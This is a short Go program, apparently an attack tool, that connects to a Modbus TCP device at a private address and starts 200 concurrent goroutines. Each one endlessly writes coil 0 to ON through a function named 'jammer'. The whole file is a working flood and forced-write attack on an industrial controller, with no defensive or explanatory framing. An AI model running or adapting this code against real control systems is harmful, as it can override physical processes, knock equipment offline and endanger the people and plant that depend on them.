package main

import (
	"fmt"
	"time"

	"sync"

	"github.com/goburrow/modbus"
)

var wait sync.WaitGroup

func jammer(target modbus.Client) {

	for {
		results, err := target.WriteSingleCoil(0, 0xFF00)

		fmt.Printf("%T\n", results)
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(results)
		}
		defer wait.Done()
	}

}

func main() {

	handler := modbus.NewTCPClientHandler("192.168.16.164:502")
	handler.Timeout = 10 * time.Second

	err := handler.Connect()
	if err != nil {
		fmt.Print(err)
	}

	defer handler.Close()

	client := modbus.NewClient(handler)

	for i := 0; i < 200; i++ {
		wait.Add(1)
		go jammer(client)
	}
	wait.Wait()
}
